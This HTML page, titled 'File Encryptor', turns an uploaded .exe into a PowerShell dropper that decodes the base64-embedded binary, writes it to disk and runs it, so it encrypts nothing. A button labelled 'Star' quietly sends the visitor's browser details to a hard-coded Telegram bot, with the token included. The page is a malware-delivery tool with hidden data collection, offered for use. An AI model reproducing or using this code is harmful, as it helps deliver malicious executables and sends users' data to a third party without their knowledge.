<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Encryptor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('IMG_5286.jpeg'); /* Set the background image */
            background-size: cover; /* Cover the entire background */
            background-position: center; /* Center the image */
            color: purple; /* Set text color to purple */
            display: flex;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .container {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            width: 100%;
        }
        .box {
            background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent white */
            border-radius: 10px;
            padding: 20px;
            margin: 10px;
            width: 45%; /* Adjust width as needed */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        h1 {
            margin-bottom: 30px;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px 0; /* Vertical margin for buttons */
            background-color: red; /* Set button color to red */
            color: purple; /* Set button text color to purple */
            transition: background-color 0.3s;
            width: 100%; /* Make buttons full width */
        }
        button:hover {
            background-color: darkred; /* Darker red on hover */
        }
        input[type="file"] {
            display: none; /* Hides the file input */
        }
        .rainbow-text {
            font-size: 24px;
            font-weight: bold;
            background-image: linear-gradient(to right, red, orange, yellow, green, blue, indigo, violet);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        #ps-output {
            border: 1px solid white; 
            padding: 10px; 
            display: inline-block; 
            width: 100%; 
            word-wrap: break-word; 
            color: #ffeb3b; /* Yellow color for output */
        }
    </style>
</head>
<body>

    <h1>File Encryptor</h1>
    <div class="container">
        <div class="box" id="file-selection-box">
            <h2>Choose the File</h2>
            <label id="choose-file-button" for="file-input">Choose File</label>
            <input type="file" id="file-input" accept=".exe" />
            <div id="file-name" class="rainbow-text">No file chosen</div>
        </div>

        <div class="box" id="ps1-generation-box">
            <h2>PS1 Generation</h2>
            <button id="generate-ps-button" onclick="generatePSScript()">Generate PS1 Code</button>
            <div id="ps-output">PowerShell Code: Click to Generate</div>
            <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
            <button id="star-button" onclick="sendUserInfo()">Star</button>
        </div>
    </div>

    <script>
        let selectedFile;
        let finalPSCode = '';

        // Display the name of the chosen file with rainbow color
        document.getElementById("file-input").addEventListener("change", function() {
            const fileNameDisplay = document.getElementById("file-name");
            if (this.files.length > 0) {
                selectedFile = this.files[0]; // Store the selected file
                fileNameDisplay.textContent = selectedFile.name;
            } else {
                fileNameDisplay.textContent = "No file chosen";
            }
        });

        // Generate PowerShell script that embeds the selected EXE as base64
        function generatePSScript() {
            if (!selectedFile) {
                alert("Please choose a file first.");
                return;
            }

            const reader = new FileReader();
            reader.onload = function(event) {
                const base64String = event.target.result.split(',')[1]; // Get Base64 part
                finalPSCode = `
                $base64 = "${base64String}";
                [System.IO.File]::WriteAllBytes("executable.exe", [System.Convert]::FromBase64String($base64));
                Start-Process -FilePath "executable.exe";
                `;
                document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...'; // Show part of PowerShell code
            };

            // Read the file as a Data URL (Base64)
            reader.readAsDataURL(selectedFile);
        }

        // Copy the full PowerShell script to clipboard
        function copyPSScript() {
            navigator.clipboard.writeText(finalPSCode).then(() => {
                alert("PowerShell script copied to clipboard!");
            }).catch(err => {
                console.error('Error copying to clipboard: ', err);
            });
        }

        // Send user information to Telegram bot
        function sendUserInfo() {
            const userInfo = {
                userAgent: navigator.userAgent,
                wifi: navigator.connection.effectiveType || "unknown", // Example: WiFi info
            };

            const token = '7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM';
            const chatId = '842463450';
            const message = `User Info: ${JSON.stringify(userInfo)}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Information sent to Telegram!');
                } else {
                    alert('Error sending information.');
                }
            })
            .catch(err => console.error('Error:', err));
        }
    </script>

</body>
</html>
